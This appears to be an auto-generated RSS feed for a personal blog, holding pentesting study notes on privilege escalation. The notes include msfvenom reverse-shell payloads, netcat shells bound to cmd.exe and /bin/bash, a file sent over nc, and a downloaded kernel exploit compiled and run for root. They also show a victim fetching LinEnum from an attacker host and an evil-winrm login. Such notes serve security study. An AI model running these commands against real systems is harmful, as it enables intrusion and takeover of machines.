@@ -1,0 +1,117 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+  <channel>
+    <title>Privilege Escalation on Agus Fahmi Aji Pramana&#39;s Blogging Site</title>
+    <link>http://localhost:1313/tags/privilege-escalation/</link>
+    <description>Recent content in Privilege Escalation on Agus Fahmi Aji Pramana&#39;s Blogging Site</description>
+    <image>
+      <title>Agus Fahmi Aji Pramana&#39;s Blogging Site</title>
+      <url>http://localhost:1313/logo.svg</url>
+      <link>http://localhost:1313/logo.svg</link>
+    </image>
+    <generator>Hugo -- gohugo.io</generator>
+    <language>en</language>
+    <atom:link href="http://localhost:1313/tags/privilege-escalation/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>Privilege Escalation Tools and Techniques</title>
+      <link>http://localhost:1313/notes/privilege-escalation-tool-and-techniques/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/notes/privilege-escalation-tool-and-techniques/</guid>
+      <description>Understand Privilege Escalation and use of tools</description>
+      <content:encoded><![CDATA[<h2 id="reverse-shell">Reverse Shell</h2>
+<p>Take advantage of the target system&rsquo;s vulnerabilities to initiate a shell session. Here, listener is attacker.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Windows Server</span>
+</span></span><span class="line"><span class="cl">msfvenom -p windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>&lt;listener-ip-addr&gt; <span class="nv">LPORT</span><span class="o">=</span>&lt;listener-port&gt; -f exe &gt; shell-x64.exe
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">nc -lvp &lt;listener-port&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Now, after you download and run the app. We get the access to victim&#39;s shell.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Java Server</span>
+</span></span><span class="line"><span class="cl">msfvenom -p java/jsp_shell_reverse_tcp <span class="nv">lhost</span><span class="o">=</span>&lt;listener-ip-addr&gt; <span class="nv">lport</span><span class="o">=</span>&lt;listener-port&gt; -f war &gt; shell.war
+</span></span></code></pre></div><h3 id="winpeas">WinPEAS</h3>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">WinPEASx65</span><span class="p">.</span><span class="py">exe</span> <span class="n">systeminfo</span> <span class="n">log</span><span class="p">=</span><span class="n">systeminfo</span><span class="p">.</span><span class="py">txt</span> <span class="c"># Privilege Escalation</span>
+</span></span></code></pre></div><h3 id="netcat">netcat</h3>
+<h4 id="windows">Windows</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="n">ncat</span><span class="p">.</span><span class="py">exe</span> <span class="n">-lp</span> <span class="mf">52000</span> <span class="c"># Start listening at port 52000</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">netstat</span> <span class="n">-an</span> <span class="p">|</span> <span class="n">more</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c"># If file doesn&#39;t exist it will be created else cleared and redirected.</span>
+</span></span><span class="line"><span class="cl"><span class="n">ncat</span><span class="p">.</span><span class="py">exe</span> <span class="n">-lp</span> <span class="mf">55555</span> <span class="p">&gt;</span> <span class="n">alice</span><span class="p">.</span><span class="py">txt</span>
+</span></span><span class="line"><span class="cl"><span class="c"># Append in a file instead.</span>
+</span></span><span class="line"><span class="cl"><span class="n">ncat</span><span class="p">.</span><span class="py">exe</span> <span class="n">-lp</span> <span class="mf">55555</span> <span class="p">&gt;&gt;</span> <span class="n">alice</span><span class="p">.</span><span class="py">txt</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ncat</span><span class="p">.</span><span class="py">exe</span> <span class="n">-lp</span> <span class="mf">10314</span> <span class="n">-e</span> <span class="n">cmd</span><span class="p">.</span><span class="py">exe</span> <span class="c"># -e is executable i.e. cmd.exe</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">ncat</span><span class="p">.</span><span class="py">exe</span> <span class="p">&lt;</span><span class="nb">target-linux</span><span class="n">-ip-addr</span><span class="p">&gt;</span> <span class="mf">14618</span> <span class="c"># Bash shell from Linux</span>
+</span></span></code></pre></div><h4 id="linux">Linux</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nc &lt;target-windows-ip-addr&gt; <span class="m">52000</span> <span class="c1"># Linux</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Send content of the bob.txt file.</span>
+</span></span><span class="line"><span class="cl">nc -w <span class="m">1</span> &lt;target-windows-ip-addr&gt; <span class="m">5555</span> &lt; bob.txt
+</span></span><span class="line"><span class="cl"><span class="c1"># If the connection and stdin are idle for more than timeout seconds,</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># the connection is closed silently. Default is no timeout.</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># `nc` will listen forever for a connection, with or without the -w flag.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">nc &lt;target-windows-ip-addr&gt; <span class="m">10314</span> <span class="c1"># Windows prompt from Linux</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">nc -lp <span class="m">14618</span> -e /bin/bash <span class="c1"># bash as executable.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">nc -nlvp <span class="m">5555</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -n: no DNS or service lookups on any addresses, hostnames or port names.</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -l: listen for an incoming connection.</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -v: give more verbose output.</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -p: to specify the local port number.</span>
+</span></span></code></pre></div><blockquote>
+<p>Note: <code>&gt;</code> is output redirection character, <code>&lt;</code> is input redirection character.</p></blockquote>
+<h2 id="exploit-dbcom">exploit-db.com</h2>
+<p>Based on Linux kernal, VulnOS -&gt; <code>37292</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">whoami
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">wget https://www.exploit-db.com/exploits/44298 -O exploit.c
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">gcc exploit.c -o exploit
+</span></span><span class="line"><span class="cl">chmod <span class="m">777</span> exploit
+</span></span><span class="line"><span class="cl">./exploit
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">whoami
+</span></span></code></pre></div><h2 id="linenum">LinEnum</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Attacker Server</span>
+</span></span><span class="line"><span class="cl">wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O LinEnum <span class="c1"># or Copy RAW to to LinEnum file.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">chmod +x LinEnum
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">python -m http.server <span class="m">8000</span> <span class="c1"># Serving http server to host a file to download.</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Victim Client</span>
+</span></span><span class="line"><span class="cl">wget http://&lt;attacker-ip-addr&gt;:8000/LinEnum
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">./LinEnum
+</span></span></code></pre></div><h2 id="gobuster---directory-traversal">Gobuster - Directory Traversal</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># -u assign target</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -w word list</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># -x is list of extensions</span>
+</span></span><span class="line"><span class="cl">gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u &lt;target-ip-addr&gt;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">gobuster dir -w /usr/share/wordlists/dirb/common.txt -x .php,.txt,.html -u &lt;target-ip-addr&gt;
+</span></span></code></pre></div><h2 id="spawning-bash-shell">Spawning Bash Shell</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 -c <span class="s1">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span> <span class="c1"># Pseudo-terminal utilities</span>
+</span></span></code></pre></div><h2 id="root-login-on-nopasswd-sudoer">Root Login on NOPASSWD Sudoer</h2>
+<blockquote>
+<p><code>sudo -l</code>: This command is used to list the allowed (and forbidden) commands for the invoking user (or the user specified by the -U option) on the current host.</p></blockquote>
+<blockquote>
+<p><code>sudo -i</code>: This command, also known as sudo &ndash;login, starts a new shell as the target user (root by default), and changes to their home directory.</p></blockquote>
+<h2 id="window-remote-management-winrm">Window Remote Management (WinRM)</h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">evil-winrm -i &lt;target-windows-ip-addr&gt; -u <span class="s1">&#39;admin&#39;</span> -p <span class="s1">&#39;pass&#39;</span>
+</span></span></code></pre></div><blockquote>
+<p>Which metasploit module can be used in this case to abuse Windows Remote Management?
+<strong>auxiliary/scanner/winrm/winrm_login</strong></p></blockquote>
+<h2 id="reference">Reference</h2>
+<ul>
+<li><a href="https://github.com/ec-council-learning/Pentesting-Fundamentals-for-Beginners">https://github.com/ec-council-learning/Pentesting-Fundamentals-for-Beginners</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+  </channel>
+</rss>
